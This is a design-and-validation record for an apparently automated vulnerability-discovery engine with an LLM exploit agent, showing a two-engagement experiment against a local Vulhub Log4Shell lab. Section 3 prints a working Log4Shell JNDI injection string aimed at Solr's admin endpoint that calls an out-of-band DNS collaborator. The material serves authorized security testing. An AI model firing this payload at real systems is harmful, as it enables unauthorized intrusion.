# Capability-learning loop — slice 2 (READ side) live validation

> **Raw artifacts:** the `outputs/…` run artifacts cited below are local-only by policy — retained by the operator, not committed to the repo.

**Status: BUILT + live-validated.** Slice 2 is the **read / load-as-prior** half of the
Layer-2 capability-learning loop designed in
[`discovery-engine-capability-learning-design.md`](./discovery-engine-capability-learning-design.md)
(§2.3 `CapabilityRecall`, §2.4 version predicates + transfer edges, §4 load-as-prior,
§5 zero-FP, §6 the two-engagement proof plan). Slice 1 (the WRITE side) is recorded in
that design doc's "Slice 1 build addendum". This doc is the as-built + RAW-evidence
record for slice 2.

The one-line thesis, proven from raw artifacts: **a capability confirmed on one
engagement makes the system find that capability on a later engagement whose own
source is too partial to derive it — recall changes the PATH to the finding, never
the finding (the live P1–P6 proof still confirms).**

---

## 1. What slice 2 builds (the READ side)

| Piece | Where | What it does |
|---|---|---|
| `version_satisfies` | `discovery/versions.py` | Deterministic predicate matcher over `'<X' \| '<=X' \| '=X' \| '[X,Y]' \| '*'` (+ `'>X'/'>=X'`), on the shared `parse_version` tuple idiom. A recall fires only when the observed version satisfies the fact's predicate. |
| `bundles` / `successor` edge writers | `discovery/relations.py` | Deterministic-only transfer edges — `apache-solr@8.11.0 → log4j-core@2.14.1` (manifest-derived, sim 1.0) and version lineage. The dormant `technology_relations` table's **first production writers**. `similar` (heuristic/LLM) is deferred. |
| `capability_recall` | `discovery/recall.py` | **Pure** READ over KB-dumped fact + relation rows: expand the fingerprint over transfer edges, filter by `version_satisfies`, yield `CapabilityRecall` priors. No I/O, no write, no emission path. |
| load-as-prior seam | `discovery/engine.py`, `discovery/hypothesis.py` | `discover()` computes recalls (after ingest + fingerprint, before `generate_hypotheses`); `generate_hypotheses(seeded_by=…)` **boosts** a matching cold hypothesis (case a, keeps the earned grade) or **seeds** one the source didn't derive (case b, HYPOTHESIZED reachability, capped). |
| async orchestrator seam | `orchestrator/orchestrator.py` | `_build_discovery_tasks` dumps the capability store as the recall prior, then writes the `bundles`/`successor` transfer edges back for the *next* engagement. |
| §6.2 trace fields | `discovery/engine.py`, `agents/exploit.py` | Per hypothesis: `prior_source` (`capability_recall`/`cold_derivation`), `rank_score`, rank ordinal; plus the actual dispatch ordinal at `_step_execute_exploits`. |

**Scope fence held.** Recall NEVER emits and never marks a target vulnerable —
emission stays the unchanged P1–P6 proof on the live target (§5). The proof engine,
Layer-1 oracles, and the slice-1 exploit-side write-back are untouched. `similar`
edges, the offline catalog grower, and cross-service reachability are deferred.

---

## 2. The §6 two-engagement experiment (real run, no harness)

Driver: [`scripts/live_capability_recall_validation.py`](../scripts/live_capability_recall_validation.py).
Target: a **live** Vulhub `log4j/CVE-2021-44228` — Apache Solr **8.11.0** +
`log4j-core` **2.14.1** on `:8983` (jar path re-confirmed in-container). A **live** OOB
collaborator (DNS+HTTP, health-checked) and a **live Anthropic** exploit LLM. No mocks.

Pre-flight (all green, STOP-on-fail): `ANTHROPIC_API_KEY` present · Solr `admin/cores`
→ HTTP 200 · `log4j-core-2.14.1.jar` present in the container · collaborator
self-round-trip healthy (`dns_authority=host.docker.internal:15353`).

| Engagement | KB | Source | Outcome |
|---|---|---|---|
| **A (cold)** | fresh (0 facts, 0 edges) | **full** log4shell source | cold-derive 8 `log_interpolation` hypotheses (`prior_source=cold_derivation`) → **8 LIVE P6 confirms** → write-back records the `log4j-core =2.14.1` fact; the seam writes the `apache-solr@8.11.0 → log4j-core@2.14.1` bundles edge. |
| **B cold-control** | fresh (0 facts) | **partial** (log-sink file `CoreAdminOperation.java` withheld) | recognizer finds no log sink → **0 `log_interpolation` hypotheses**. |
| **B warm** | capability_kb **from A** | **same partial** source | recall reaches the fact via the bundles edge → **3 recall-seeded hypotheses** (`prior_source=capability_recall`, `hypothesized`, re-keyed on `log4j-core@2.14.1`) → **3 LIVE P6 confirms**. |

Engagement ids: A `6b7df62d…`, cold-control `874f879d…`, warm `50b5dbb3…`.

---

## 3. The metric, read from RAW (non-self-graded)

### (1) Catalog-state diff — `outputs/capability-recall/*.json`

```
capability_facts       BEFORE A: 0 rows   AFTER A: 1 row
  log4j-core  pred==2.14.1  class=log_interpolation  sink=log4j.log_sink  grade=confirmed  conf=0.5
technology_relations   BEFORE A: 0 rows   AFTER A: 1 row
  apache-solr@8.11.0 --bundles(1.0)--> log4j-core@2.14.1
```

The row's existence + content is the learning — the dormant table's first production
edge, keyed on the carrying dependency (not the app), so any log4j-bundling app
inherits the capability.

### (2) Trace diff — `trace_coldControlB.jsonl` vs `trace_warmB.jsonl`, SAME partial source

```
COLD-CONTROL B: LOG_INTERPOLATION hypotheses in trace = 0
WARM B        : LOG_INTERPOLATION hypotheses in trace = 3   (all prior_source=capability_recall)
  hyp:recall:log_interpolation.log4j_jndi:action  prior=capability_recall rank=0.225 grade=hypothesized tech=log4j-core v=2.14.1
  hyp:recall:log_interpolation.log4j_jndi:core     …
  hyp:recall:log_interpolation.log4j_jndi:name     …
```

**Hypothesis-present (warm) vs hypothesis-absent (cold-control) under identical partial
source is the unambiguous "recall substituted for derivation" signal.** Recall reached
the fact via the `bundles` edge, carrying the dependency's exact version, and seeded
the vuln the recognizer could not find.

### (3) The warm-B finding is confirmed by the LIVE proof, not recall — `report_warmB.json`

The warm-B `[CRITICAL] Log4Shell … action` finding is P6-confirmed and raw-auditable:

```
outbound_probe : GET …/solr/admin/cores?action=${jndi:dns://host.docker.internal:15353/xwkbrzyovbpa4kfs3aaccb2lgi}
confirming_excerpt: inbound callback proto=dns src=127.0.0.1 host=xwkbrzyovbpa4kfs3aaccb2lgi   (SAME nonce)
control        : a fresh nonce minted but NEVER sent → no callback (proves genuine inbound traffic)
provenance     : tech=log4j-core  confirmation=P6  reachability=hypothesized (recall-seeded)
```

The nonce in the outbound probe equals the nonce in the inbound DNS callback, and the
never-sent control drew no callback — the §5 invariant made concrete: **recall changed
the path (seeded the `action` hypothesis a cold start over the same partial source
never produced); the unforgeable P6 callback is what confirmed the finding.**

---

## 4. Verdict

```
(1) catalog-state diff: confirmed log4j fact + real bundles edge   : PASS
(2) trace diff: cold-control 0 hyps, warm 3 recall-seeded hyps      : PASS
(3) warm-B confirmed by the LIVE P1-P6 proof (recall changed path)  : PASS
```

Raw artifacts: `outputs/capability-recall/` — `capability_facts_{before,after}.json`,
`technology_relations_{before,after}.json`, `report_warmB.json`,
`trace_warmB.jsonl`, `trace_coldControlB.jsonl`, `live_run_stdout.log`.

Regression: the keyless pytest selection is green (incl. the deterministic
`test_recall_seam` / `test_capability_recall` / `test_versions` gates and the
unchanged `test_log4shell_class`).
